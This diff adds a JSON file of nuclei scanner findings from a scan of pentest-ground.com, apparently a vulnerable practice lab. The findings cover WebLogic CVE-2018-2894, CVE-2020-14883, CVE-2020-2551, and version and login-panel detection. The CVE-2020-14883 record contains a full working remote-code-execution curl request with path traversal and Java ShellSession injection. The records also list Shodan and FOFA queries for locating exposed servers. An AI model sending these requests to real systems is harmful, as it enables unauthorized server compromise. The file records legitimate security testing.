@@ -1,0 +1,297 @@
+{
+  "schema": "nuclei_finding_v1",
+  "tool": "nuclei",
+  "scenario_id": "pg_weblogic_phase_hint_weblogic",
+  "source_jsonl": ".docs/docs-for-cli-tools/exploration_scratch/nuclei/strategic/vuln_lab/pg_weblogic_phase_hint_weblogic.jsonl",
+  "started_at": "2026-07-05T08:59:41.987637+00:00",
+  "finding_summary_lines": 5,
+  "text_role": "one line per JSONL finding: [severity] template-id @ matched-at",
+  "structured_role": "full JSONL finding objects in records[]",
+  "records": [
+    {
+      "template-url": "https://cloud.projectdiscovery.io/public/CVE-2018-2894",
+      "template-id": "CVE-2018-2894",
+      "template-path": "C:\\projects\\spiderfeet\\.tools\\nuclei-templates\\http\\cves\\2018\\CVE-2018-2894.yaml",
+      "info": {
+        "name": "Oracle WebLogic Server - Remote Code Execution",
+        "author": [
+          "geeknik",
+          "pdteam"
+        ],
+        "tags": [
+          "cve2018",
+          "cve",
+          "oracle",
+          "weblogic",
+          "rce",
+          "vulhub",
+          "intrusive",
+          "vkev",
+          "vuln"
+        ],
+        "description": "The Oracle WebLogic Server component of Oracle Fusion Middleware (subcomponent: WLS - Web Services) is susceptible to a remote code execution vulnerability that is easily exploitable and could allow unauthenticated attackers with network access via HTTP to compromise the server. Supported versions that are affected are 12.1.3.0, 12.2.1.2 and 12.2.1.3.\n",
+        "impact": "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary code on the affected system.\n",
+        "reference": [
+          "https://blog.detectify.com/2018/11/14/technical-explanation-of-cve-2018-2894-oracle-weblogic-rce/",
+          "https://github.com/vulhub/vulhub/tree/fda47b97c7d2809660a4471539cd0e6dbf8fac8c/weblogic/CVE-2018-2894",
+          "https://nvd.nist.gov/vuln/detail/CVE-2018-2894",
+          "http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html",
+          "http://www.securitytracker.com/id/1041301"
+        ],
+        "severity": "critical",
+        "metadata": {
+          "fofa-query": "title=\"oracle peoplesoft sign-in\"",
+          "google-query": "intitle:\"oracle peoplesoft sign-in\"",
+          "max-request": 3,
+          "product": "weblogic_server",
+          "shodan-query": [
+            "http.title:\"oracle peoplesoft sign-in\"",
+            "product:\"oracle weblogic\""
+          ],
+          "vendor": "oracle"
+        },
+        "classification": {
+          "cve-id": [
+            "cve-2018-2894"
+          ],
+          "cwe-id": null,
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "epss-score": 0.50224,
+          "epss-percentile": 0.98763,
+          "cpe": "cpe:2.3:a:oracle:weblogic_server:10.3.6.0.0:*:*:*:*:*:*:*"
+        },
+        "remediation": "Apply the latest security patches provided by Oracle to mitigate this vulnerability.\n"
+      },
+      "type": "http",
+      "host": "pentest-ground.com",
+      "port": "7001",
+      "scheme": "https",
+      "url": "https://pentest-ground.com:7001",
+      "matched-at": "https://pentest-ground.com:7001/ws_utc/css/config/keystore/1783241789481_3G4reM2L7Id1te5C6TAGe4oYzI5.jsp",
+      "ip": "178.79.134.182",
+      "timestamp": "2026-07-05T18:56:33.1726243+10:00",
+      "curl-command": "curl -X 'GET' -d '' -H 'Host: pentest-ground.com:7001' -H 'User-Agent: Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' 'https://pentest-ground.com:7001/ws_utc/css/config/keystore/1783241789481_3G4reM2L7Id1te5C6TAGe4oYzI5.jsp'",
+      "matcher-status": true
+    },
+    {
+      "template-url": "https://cloud.projectdiscovery.io/public/CVE-2020-14883",
+      "template-id": "CVE-2020-14883",
+      "template-path": "C:\\projects\\spiderfeet\\.tools\\nuclei-templates\\http\\cves\\2020\\CVE-2020-14883.yaml",
+      "info": {
+        "name": "Oracle Fusion Middleware WebLogic Server Administration Console - Remote Code Execution",
+        "author": [
+          "pdteam",
+          "vicrack"
+        ],
+        "tags": [
+          "cve",
+          "cve2020",
+          "oracle",
+          "rce",
+          "weblogic",
+          "kev",
+          "packetstorm",
+          "vkev",
+          "vuln"
+        ],
+        "description": "The Oracle Fusion Middleware WebLogic Server admin console in versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 is vulnerable to an easily exploitable vulnerability that allows high privileged attackers with network access via HTTP to compromise Oracle WebLogic Server.\n",
+        "impact": "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary code on the affected system.\n",
+        "reference": [
+          "https://packetstormsecurity.com/files/160143/Oracle-WebLogic-Server-Administration-Console-Handle-Remote-Code-Execution.html",
+          "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14883",
+          "https://www.oracle.com/security-alerts/cpuoct2020.html",
+          "http://packetstormsecurity.com/files/160143/Oracle-WebLogic-Server-Administration-Console-Handle-Remote-Code-Execution.html",
+          "https://github.com/1n7erface/PocList"
+        ],
+        "severity": "high",
+        "metadata": {
+          "fofa-query": "title=\"oracle peoplesoft sign-in\"",
+          "google-query": "intitle:\"oracle peoplesoft sign-in\"",
+          "max-request": 1,
+          "product": "weblogic_server",
+          "shodan-query": [
+            "title:\"Oracle PeopleSoft Sign-in\"",
+            "product:\"oracle weblogic\"",
+            "http.title:\"oracle peoplesoft sign-in\""
+          ],
+          "vendor": "oracle",
+          "verified": true
+        },
+        "classification": {
+          "cve-id": [
+            "cve-2020-14883"
+          ],
+          "cwe-id": null,
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 7.2,
+          "epss-score": 0.97929,
+          "epss-percentile": 0.999,
+          "cpe": "cpe:2.3:a:oracle:weblogic_server:10.3.6.0.0:*:*:*:*:*:*:*"
+        },
+        "remediation": "Apply the necessary patches or updates provided by Oracle to mitigate this vulnerability.\n"
+      },
+      "type": "http",
+      "host": "pentest-ground.com",
+      "port": "7001",
+      "scheme": "https",
+      "url": "https://pentest-ground.com:7001",
+      "matched-at": "https://pentest-ground.com:7001/console/images/%252e%252e%252fconsole.portal",
+      "ip": "178.79.134.182",
+      "timestamp": "2026-07-05T18:56:42.3591065+10:00",
+      "curl-command": "curl -X 'POST' -d 'test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('\\''weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(\"getServletRequest\").invoke(obj); String result = new StringBuilder(\"3G4reVRfT0PlqplczFWVgQFXhdU\").reverse().toString(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush(); currentThread.interrupt();'\\'')' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Host: pentest-ground.com:7001' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1 rv:6.0; vi-VN) AppleWebKit/535.6.1 (KHTML, like Gecko) Version/4.1 Safari/535.6.1' 'https://pentest-ground.com:7001/console/images/%252e%252e%252fconsole.portal'",
+      "matcher-status": true
+    },
+    {
+      "template-url": "https://cloud.projectdiscovery.io/public/weblogic-detect",
+      "template-id": "weblogic-detect",
+      "template-path": "C:\\projects\\spiderfeet\\.tools\\nuclei-templates\\http\\technologies\\weblogic-detect.yaml",
+      "info": {
+        "name": "Detect Weblogic",
+        "author": [
+          "pdteam"
+        ],
+        "tags": [
+          "tech",
+          "weblogic",
+          "intrusive",
+          "discovery"
+        ],
+        "severity": "info",
+        "metadata": {
+          "max-request": 1,
+          "shodan-query": "product:\"Oracle Weblogic\""
+        }
+      },
+      "type": "http",
+      "host": "pentest-ground.com",
+      "port": "7001",
+      "scheme": "https",
+      "url": "https://pentest-ground.com:7001",
+      "matched-at": "https://pentest-ground.com:7001/3G4reVeR6m7DeOOvUIYnIT08cYs",
+      "ip": "178.79.134.182",
+      "timestamp": "2026-07-05T18:59:04.4301774+10:00",
+      "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36' 'https://pentest-ground.com:7001/3G4reVeR6m7DeOOvUIYnIT08cYs'",
+      "matcher-status": true
+    },
+    {
+      "template-url": "https://cloud.projectdiscovery.io/public/CVE-2020-2551",
+      "template-id": "CVE-2020-2551",
+      "template-path": "C:\\projects\\spiderfeet\\.tools\\nuclei-templates\\http\\cves\\2020\\CVE-2020-2551.yaml",
+      "info": {
+        "name": "Oracle WebLogic Server - Remote Code Execution",
+        "author": [
+          "dwisiswant0"
+        ],
+        "tags": [
+          "cve2020",
+          "cve",
+          "oracle",
+          "weblogic",
+          "rce",
+          "unauth",
+          "kev",
+          "vkev",
+          "vuln"
+        ],
+        "description": "Oracle WebLogic Server (Oracle Fusion Middleware (component: WLS Core Components) is susceptible to a remote code execution vulnerability. Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 2.2.1.3.0 and 12.2.1.4.0. This easily exploitable vulnerability could allow unauthenticated attackers with network access via IIOP to compromise Oracle WebLogic Server.\n",
+        "impact": "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary code on the affected system.\n",
+        "reference": [
+          "https://github.com/hktalent/CVE-2020-2551",
+          "https://nvd.nist.gov/vuln/detail/CVE-2020-2551",
+          "https://www.oracle.com/security-alerts/cpujan2020.html",
+          "https://github.com/neilzhang1/Chinese-Charts",
+          "https://github.com/pjgmonteiro/Pentest-tools"
+        ],
+        "severity": "critical",
+        "metadata": {
+          "fofa-query": "title=\"oracle peoplesoft sign-in\"",
+          "google-query": "intitle:\"oracle peoplesoft sign-in\"",
+          "max-request": 1,
+          "product": "weblogic_server",
+          "shodan-query": [
+            "http.title:\"oracle peoplesoft sign-in\"",
+            "product:\"oracle weblogic\""
+          ],
+          "vendor": "oracle"
+        },
+        "classification": {
+          "cve-id": [
+            "cve-2020-2551"
+          ],
+          "cwe-id": null,
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "epss-score": 0.93168,
+          "epss-percentile": 0.99821,
+          "cpe": "cpe:2.3:a:oracle:weblogic_server:10.3.6.0.0:*:*:*:*:*:*:*"
+        },
+        "remediation": "Apply the latest security patches provided by Oracle to mitigate this vulnerability.\n"
+      },
+      "type": "http",
+      "host": "pentest-ground.com",
+      "port": "7001",
+      "scheme": "https",
+      "url": "https://pentest-ground.com:7001",
+      "matched-at": "https://pentest-ground.com:7001/console/login/LoginForm.jsp",
+      "ip": "178.79.134.182",
+      "timestamp": "2026-07-05T18:59:35.879313+10:00",
+      "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20' 'https://pentest-ground.com:7001/console/login/LoginForm.jsp'",
+      "matcher-status": true
+    },
+    {
+      "template-url": "https://cloud.projectdiscovery.io/public/weblogic-login",
+      "template-id": "weblogic-login",
+      "template-path": "C:\\projects\\spiderfeet\\.tools\\nuclei-templates\\http\\exposed-panels\\weblogic-login.yaml",
+      "info": {
+        "name": "Oracle WebLogic Login Panel - Detect",
+        "author": [
+          "bing0o",
+          "meme-lord"
+        ],
+        "tags": [
+          "panel",
+          "oracle",
+          "weblogic",
+          "login",
+          "discovery"
+        ],
+        "description": "Oracle WebLogic login panel was detected.",
+        "severity": "info",
+        "metadata": {
+          "fofa-query": "title=\"oracle peoplesoft sign-in\"",
+          "google-query": "intitle:\"oracle peoplesoft sign-in\"",
+          "max-request": 1,
+          "product": "weblogic_server",
+          "shodan-query": [
+            "product:\"Oracle Weblogic\"",
+            "product:\"oracle weblogic\"",
+            "http.title:\"oracle peoplesoft sign-in\""
+          ],
+          "vendor": "oracle"
+        },
+        "classification": {
+          "cve-id": null,
+          "cwe-id": [
+            "cwe-200"
+          ],
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+          "cpe": "cpe:2.3:a:oracle:weblogic_server:*:*:*:*:-:*:*:*"
+        }
+      },
+      "type": "http",
+      "host": "pentest-ground.com",
+      "port": "7001",
+      "scheme": "https",
+      "url": "https://pentest-ground.com:7001",
+      "matched-at": "https://pentest-ground.com:7001/console/login/LoginForm.jsp",
+      "extracted-results": [
+        "12.2.1.3.0"
+      ],
+      "ip": "178.79.134.182",
+      "timestamp": "2026-07-05T18:59:35.879313+10:00",
+      "curl-command": "curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.1 Safari/525.20' 'https://pentest-ground.com:7001/console/login/LoginForm.jsp'",
+      "matcher-status": true
+    }
+  ]
+}
